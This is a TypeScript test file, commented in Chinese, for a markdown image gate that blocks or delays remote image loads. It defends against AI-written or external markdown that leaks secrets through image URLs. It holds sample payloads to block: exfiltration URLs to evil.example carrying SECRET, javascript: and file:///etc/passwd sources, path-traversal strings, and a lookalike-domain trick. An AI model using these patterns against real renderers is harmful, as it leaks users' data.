/**
 * 远程图「默认不加载、点击才加载」闸门的纯函数部分（lib/remote-image-gate.ts + rehype-strip-media-sources.ts）。
 *
 * 防的是：AI / 外部文档的 markdown 里 `![](https://evil.example/p?d=<密钥>)` 一渲染浏览器就自动请求、把数据带出去。
 * 这里钉：① 哪些地址算「直接渲染 / 需点击 / 一律拦」；② 「已点击加载」记忆的语义；③ 展示文案；④ 剥 `<source>` / srcset 的 AST 插件。
 * 组件 / 管线的端到端（SSR）在 tests/markdown-remote-image-ssr.test.ts。
 */
import { afterEach, describe, expect, it, vi } from "vitest";

import { toLoadableImageSrc } from "@/lib/local-image-src";
import { rehypeStripMediaSources } from "@/lib/rehype-strip-media-sources";
import {
  blockedImageText,
  classifyLoadableImageSrc,
  displayImageAlt,
  isRemoteImageLoaded,
  markRemoteImageLoaded,
  remoteImageAriaLabel,
  remoteImageButtonText,
  remoteImageInlineText,
  resetRemoteImageLoadedForTests,
  subscribeRemoteImageLoaded,
} from "@/lib/remote-image-gate";

afterEach(() => {
  resetRemoteImageLoadedForTests();
});

/** 与 MarkdownImage 同口径：先过 toLoadableImageSrc（本地路径折成通道、UNC 清空），再判 */
const gateOf = (src: string) => classifyLoadableImageSrc(toLoadableImageSrc(src));

describe("远程 http(s) 图：需点击（remote），key 是规范化后的完整 URL", () => {
  it("普通 https：key = 原 URL，host 给人看", () => {
    expect(classifyLoadableImageSrc("https://evil.example/p?d=SECRET")).toEqual({
      kind: "remote",
      key: "https://evil.example/p?d=SECRET",
      host: "evil.example",
    });
  });

  it("大小写 scheme / host、缺斜杠的 `https:host/x` 都规范成同一个 key（点一个、同一张图的别的写法也算已加载）", () => {
    const keys = [
      "https://evil.example/p?d=SECRET",
      "HTTPS://EVIL.Example/p?d=SECRET",
      "https:evil.example/p?d=SECRET",
    ].map((u) => {
      const g = classifyLoadableImageSrc(u);
      expect(g.kind, u).toBe("remote");
      return g.kind === "remote" ? g.key : "";
    });
    expect(new Set(keys).size).toBe(1);
  });

  it("端口保留在 host 展示里；userinfo 不会骗人（host 取真正的主机）；IDN 显示 punycode", () => {
    expect(classifyLoadableImageSrc("http://evil.example:8080/x")).toMatchObject({ kind: "remote", host: "evil.example:8080" });
    expect(classifyLoadableImageSrc("https://trusted.com@evil.example/x")).toMatchObject({ kind: "remote", host: "evil.example" });
    const idn = classifyLoadableImageSrc("https://例え.jp/x");
    expect(idn).toMatchObject({ kind: "remote" });
    expect(idn.kind === "remote" && idn.host.startsWith("xn--")).toBe(true);
  });

  it("本机别的端口的普通图（非 /api 回环）也算远程：点击才加载", () => {
    expect(classifyLoadableImageSrc("http://localhost:3000/a.png").kind).toBe("remote");
  });

  it("超长 host 展示被截断：**保留尾部**（…evil.example），key 不截（R7-5）", () => {
    const host = `${"a".repeat(80)}.example`;
    const g = classifyLoadableImageSrc(`https://${host}/x`);
    expect(g.kind).toBe("remote");
    if (g.kind === "remote") {
      expect(g.host.length).toBeLessThan(host.length);
      expect(g.host.startsWith("…")).toBe(true); // 省略号在头部
      expect(g.host.endsWith(".example")).toBe(true); // 真正的域在尾部
      expect(g.host).toBe(`…${host.slice(-64)}`);
      expect(g.key).toContain(host);
    }
  });

  it("R7-5 伪装：`accounts.google.com.` + 填充 + `.evil.example` 展示出来最右边必须是 evil.example，而不是 google 前缀", () => {
    const host = `accounts.google.com.${"a".repeat(60)}.evil.example`;
    const g = classifyLoadableImageSrc(`https://${host}/p?d=SECRET`);
    expect(g.kind).toBe("remote");
    if (g.kind === "remote") {
      expect(g.host.endsWith(".evil.example")).toBe(true);
      expect(g.host.startsWith("accounts.google.com")).toBe(false); // 旧实现从右截 → 以 accounts.google.com. 开头、evil.example 被吃掉
      expect(g.host.length).toBe(65); // 省略号 + 64 字符
      expect(g.key).toContain(host);
    }
  });

  it("R7-5：端口在尾部，同样保留；刚好 64 字符不截", () => {
    const longHost = `${"b".repeat(70)}.example`;
    const g = classifyLoadableImageSrc(`https://${longHost}:8443/x`);
    expect(g.kind === "remote" && g.host.endsWith(".example:8443")).toBe(true);
    const exact64 = `${"c".repeat(56)}.example`; // 56 + 8 = 64
    expect(exact64.length).toBe(64);
    expect(classifyLoadableImageSrc(`https://${exact64}/x`)).toMatchObject({ kind: "remote", host: exact64 });
  });
});

describe("畸形 / 不安全：一律 blocked（不渲染图片、点击也不加载）", () => {
  const BLOCKED: Array<[string, unknown]> = [
    ["空串", ""],
    ["undefined", undefined],
    ["非字符串", 123],
    ["协议相对 //host", "//evil.example/p?d=SECRET"],
    ["协议相对（多斜杠）", "///evil.example/p"],
    ["反斜杠 UNC", "\\\\evil.example\\x"],
    ["斜杠 + 反斜杠（浏览器当协议相对）", "/\\evil.example/x"],
    ["URL 里夹反斜杠", "https://evil.example\\x"],
    ["前导空格", " https://evil.example/x"],
    ["尾随空格", "https://evil.example/x "],
    ["内部空格", "https://evil.example/a b"],
    ["内部 tab", "https://evil\t.example/x"],
    ["换行", "https:\n//evil.example/x"],
    ["NUL", "https://evil.example/\u0000x"],
    ["C0 控制符", "https://evil.example/\u0001x"],
    ["零宽字符", "https://evil\u200b.example/x"],
    ["NBSP", "https://evil.example/\u00a0x"],
    ["javascript:", "javascript:alert(1)"],
    ["JavaScript:（大小写）", "JavaScript:alert(1)"],
    ["vbscript:", "vbscript:msgbox(1)"],
    ["file:", "file:///etc/passwd"],
    ["ftp:", "ftp://evil.example/x"],
    ["ws:", "ws://evil.example/x"],
    ["自定义 scheme", "feishu://evil/x"],
    ["about:", "about:blank"],
    ["半截 https://", "https://"],
    ["空 host 带端口", "https://:80/x"],
    ["相对路径爬目录", "../a.png"],
    ["相对路径中间爬目录", "a/../../b.png"],
    ["绝对路径带 ..", "/../x"],
    ["编码的 ..", "%2e%2e/x"],
    ["编码的 .. 在中间（大小写）", "a/%2E%2e/b"],
    // R7-6：没有 scheme 的相对路径在 base 为 `/` 的页面会解析成同源 GET（`<img>` 不带 Origin、渲染即触发）→ 一律拦
    ["相对路径 api/x（解析成同源 /api/x）", "api/repo-branches?path=x"],
    ["相对路径 api/x 无查询", "api/x"],
    ["相对路径 _next/x", "_next/x"],
    ["相对路径 ./x", "./x"],
    ["相对路径 ./api/x", "./api/repo-branches?path=x"],
    ["裸文件名 x.png", "x.png"],
    ["相对子目录 images/a.png", "images/a.png"],
    ["相对 ./a.png", "./a.png"],
    ["相对路径伪装成白名单（缺前导斜杠）", "api/local-image?path=%2Fx"],
    ["相对路径伪装成 uploads（缺前导斜杠）", "api/tasks/t1/uploads/a.png"],
    ["绝对站内路径不在白名单（/api/x）", "/api/repo-branches?path=x"],
    ["绝对站内路径不在白名单（/_next/x）", "/_next/static/x.png"],
    ["绝对站内路径不在白名单（/a/b.png）", "/a/b.png?x=../y"],
    ["白名单前缀但多一段（local-image/…）", "/api/local-image/extra?path=x"],
    ["uploads 里带 .. 段", "/api/tasks/t1/uploads/../../repo-branches"],
    ["uploads 里 %2e%2e 段", "/api/tasks/t1/uploads/%2e%2e/x"],
    ["uploads 文件名是 .", "/api/tasks/t1/uploads/."],
    ["uploads 多一级目录", "/api/tasks/t1/uploads/sub/a.png"],
    ["uploads 的任务 id 是 ..", "/api/tasks/../uploads/a.png"],
    ["query 里的 # 之前是空文件名", "/api/tasks/t1/uploads/?x=1"],
  ];

  it.each(BLOCKED)("%s → blocked", (_label, input) => {
    expect(classifyLoadableImageSrc(input)).toEqual({ kind: "blocked" });
  });
});

describe("不拦：data: / blob: / 站内路径 / 本应用的本地图通道", () => {
  const DIRECT = [
    "data:image/png;base64,iVBORw0KGgo=",
    "DATA:image/png;base64,AAAA",
    "blob:https://example.com/0b1f5a52-aaaa-bbbb-cccc-000000000000",
    "/api/local-image?path=%2FUsers%2Fx%2Fqr.png",
    "/api/tasks/t1/uploads/a.png",
    "/api/tasks/t1/uploads/a.png?v=2", // query 不影响
    "/api/tasks/t1/uploads/%E5%9B%BE.png", // 编码过的中文文件名
    "/api/local-image?path=%2F..%2Fx.png", // query 里的 .. 不是路径段
  ];
  it.each(DIRECT)("%s → direct（原样）", (u) => {
    expect(classifyLoadableImageSrc(u)).toEqual({ kind: "direct", src: u });
  });

  it("串 toLoadableImageSrc：本地绝对路径（含空格 / file:// / 盘符）折成 /api/local-image 通道后是 direct", () => {
    for (const src of [
      "/Users/me/Application Support/Flowship/qr.png",
      "file:///Users/me/a%20b.png",
      "C:\\Users\\me\\a.png",
      "/Users/me/中文 图.png",
    ]) {
      const g = gateOf(src);
      expect(g.kind, src).toBe("direct");
      expect(g.kind === "direct" && g.src.startsWith("/api/local-image?path="), src).toBe(true);
    }
  });

  it("串 toLoadableImageSrc：UNC 被清成空串 → blocked（MarkdownImage 在更前面给 UNC 专用占位）", () => {
    for (const src of ["//host/share/a.png", "\\\\host\\share\\a.png", "file:////host/share/a.png"]) {
      expect(gateOf(src), src).toEqual({ kind: "blocked" });
    }
  });

  it("串 toLoadableImageSrc：回环同源 API 绝对 URL 折回站内、不再是远程", () => {
    const g = gateOf("http://127.0.0.1:8876/api/repo-branches?path=x");
    expect(g.kind).toBe("direct"); // 折成 /api/local-image 通道（白名单外的 /api/* 一律当本地路径）
    expect(g.kind === "direct" && g.src.startsWith("/api/local-image?path=")).toBe(true);
  });

  it("R7-6 串 toLoadableImageSrc：无 scheme 相对路径（api/x、_next/x、./x、x.png）整条链路都是 blocked，不会被原样放行成同源 GET", () => {
    for (const src of [
      "api/repo-branches?path=x",
      "api/x",
      "_next/static/x.png",
      "./x",
      "./api/x",
      "x.png",
      "images/a.png",
    ]) {
      expect(gateOf(src), src).toEqual({ kind: "blocked" });
    }
  });

  it("R7-6 与 local-image-src 的站内白名单同口径：toLoadableImageSrc 原样放行的 `/` 开头路径 ⟺ gate 判 direct（两边不分叉）", () => {
    const CORPUS = [
      "/api/local-image?path=%2Fx.png",
      "/api/tasks/t1/uploads/a.png",
      "/api/tasks/t1/uploads/a.png?v=2",
      "/api/tasks/t1/uploads/../../repo-branches",
      "/api/tasks/t1/uploads/%2e%2e/x",
      "/api/tasks/t1/uploads/sub/a.png",
      "/api/tasks/../uploads/a.png",
      "/api/repo-branches?path=x",
      "/api/local-image/extra",
      "/_next/static/x.png",
      "/uploads/a.png",
      "/a/b.png",
    ];
    for (const p of CORPUS) {
      const loadable = toLoadableImageSrc(p);
      const passthrough = loadable === p; // local-image-src 认为「受信站内路径」才会原样返回
      const g = classifyLoadableImageSrc(p);
      expect(g.kind === "direct", `${p} → ${g.kind}（toLoadableImageSrc ${passthrough ? "原样放行" : "折成通道"}）`).toBe(passthrough);
      // 链路终点：折成通道的、原样放行的，最终都是 direct 且都在 /api/ 站内白名单里
      const end = classifyLoadableImageSrc(loadable);
      if (!p.includes("..") && !p.includes("%2e")) {
        expect(end.kind, p).toBe("direct");
      }
    }
  });

  it("串 toLoadableImageSrc：远程图仍是 remote（外网域名不会被误折成本地）", () => {
    expect(gateOf("https://example.com/api/a.png").kind).toBe("remote");
  });
});

describe("「已点击加载」记忆：模块级 Set，key = 规范化 URL", () => {
  it("mark 之后 is 为真；没 mark 的 key 仍是假", () => {
    expect(isRemoteImageLoaded("https://evil.example/a.png")).toBe(false);
    markRemoteImageLoaded("https://evil.example/a.png");
    expect(isRemoteImageLoaded("https://evil.example/a.png")).toBe(true);
    expect(isRemoteImageLoaded("https://evil.example/b.png")).toBe(false);
  });

  it("不同写法规范成同一个 key → 点一个，同一张图的别的写法也已加载", () => {
    const first = classifyLoadableImageSrc("HTTPS://EVIL.example/p");
    const second = classifyLoadableImageSrc("https://evil.example/p");
    if (first.kind !== "remote" || second.kind !== "remote") throw new Error("应都是 remote");
    markRemoteImageLoaded(first.key);
    expect(isRemoteImageLoaded(second.key)).toBe(true);
  });

  it("订阅：首次 mark 通知一次；重复 mark 不再通知；取消订阅后不通知", () => {
    const l = vi.fn();
    const off = subscribeRemoteImageLoaded(l);
    markRemoteImageLoaded("https://evil.example/a.png");
    expect(l).toHaveBeenCalledTimes(1);
    markRemoteImageLoaded("https://evil.example/a.png");
    expect(l).toHaveBeenCalledTimes(1);
    off();
    markRemoteImageLoaded("https://evil.example/b.png");
    expect(l).toHaveBeenCalledTimes(1);
  });

  it("上限 500：超出淘汰最早的，最新的还在（防无限增长）", () => {
    for (let i = 0; i <= 500; i++) markRemoteImageLoaded(`https://evil.example/${i}.png`);
    expect(isRemoteImageLoaded("https://evil.example/0.png")).toBe(false);
    expect(isRemoteImageLoaded("https://evil.example/1.png")).toBe(true);
    expect(isRemoteImageLoaded("https://evil.example/500.png")).toBe(true);
  });

  it("reset 清空记忆", () => {
    markRemoteImageLoaded("https://evil.example/a.png");
    resetRemoteImageLoadedForTests();
    expect(isRemoteImageLoaded("https://evil.example/a.png")).toBe(false);
  });
});

describe("展示文案（alt 是不可信文本：折叠空白、截断）", () => {
  it("按钮文字 / aria-label：带域名；有 alt 才带 alt", () => {
    expect(remoteImageButtonText("example.com")).toBe("加载远程图片（example.com）");
    expect(remoteImageAriaLabel("example.com", "登录页")).toBe("加载远程图片（example.com）：登录页");
    expect(remoteImageAriaLabel("example.com", undefined)).toBe("加载远程图片（example.com）");
    expect(remoteImageAriaLabel("example.com", "   ")).toBe("加载远程图片（example.com）");
  });

  it("alt 里的换行 / 连续空白折成单个空格；超长截断", () => {
    expect(displayImageAlt("a\n\n  b\tc")).toBe("a b c");
    const long = displayImageAlt("x".repeat(500));
    expect(long.length).toBeLessThan(100);
    expect(long.endsWith("…")).toBe(true);
  });

  it("链接里的远程图 / 被拦图的纯文本占位", () => {
    expect(remoteImageInlineText("example.com", "徽章")).toBe("[远程图片：徽章（example.com）]");
    expect(remoteImageInlineText("example.com", undefined)).toBe("[远程图片（example.com）]");
    expect(blockedImageText("图")).toBe("[图片已拦截：图]");
    expect(blockedImageText(undefined)).toBe("[图片已拦截]");
  });
});

// ───────── rehype：剥 <source> / srcset ─────────

type H = { type: string; tagName?: string; properties?: Record<string, unknown>; children?: H[] };
const el = (tagName: string, properties: Record<string, unknown> = {}, children: H[] = []): H => ({
  type: "element",
  tagName,
  properties,
  children,
});
const run = (tree: H): H => {
  const transform = (rehypeStripMediaSources as unknown as () => (t: H) => void)();
  transform(tree);
  return tree;
};

describe("rehypeStripMediaSources：`<picture><source srcset>` 是 `<source>` 自己触发请求、img 槽管不到，必须在 AST 层拿掉", () => {
  it("删掉所有层级的 <source>（含 <video> 里的）；<picture> 与里面的 <img> 保留", () => {
    const tree: H = {
      type: "root",
      children: [
        el("p", {}, [
          el("picture", {}, [
            el("source", { srcSet: "https://evil.example/p?d=SECRET" }),
            el("source", { src: "https://evil.example/v" }),
            el("img", { src: "/api/local-image?path=%2Fa.png" }),
          ]),
        ]),
        el("video", {}, [el("source", { src: "https://evil.example/v" })]),
      ],
    };
    const out = JSON.stringify(run(tree));
    expect(out).not.toContain('"source"');
    expect(out).not.toContain("evil.example");
    expect(out).toContain('"picture"');
    expect(out).toContain("/api/local-image?path=%2Fa.png");
  });

  it("任意元素上的 srcSet / srcset 属性被剥掉，其它属性不动", () => {
    const tree: H = {
      type: "root",
      children: [
        el("img", { src: "/a.png", srcSet: "https://evil.example/x 1x", alt: "图" }),
        el("div", { srcset: "https://evil.example/y 2x", id: "k" }),
      ],
    };
    const [img, div] = run(tree).children ?? [];
    expect(img?.properties).toEqual({ src: "/a.png", alt: "图" });
    expect(div?.properties).toEqual({ id: "k" });
  });

  it("没有 children 的节点 / 文本节点不抛", () => {
    expect(() => run({ type: "root", children: [{ type: "text" }, el("br")] })).not.toThrow();
    expect(() => run({ type: "root" })).not.toThrow();
  });
});
